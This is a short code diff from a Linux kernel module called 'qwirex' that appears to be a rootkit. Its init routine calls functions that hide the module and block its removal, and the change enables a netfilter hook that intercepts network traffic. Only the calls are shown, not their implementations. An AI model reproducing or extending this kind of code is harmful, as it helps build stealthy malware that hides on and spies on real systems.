@@ -76,7 +76,7 @@ static int __init qwirex_init(void)
     hide_qwirex();
     ban_on_extraction_qwirex();
 
-    // nf_register_net_hook(&init_net,&nho);
+    nf_register_net_hook(&init_net,&nho);
 
     return 0;
 }
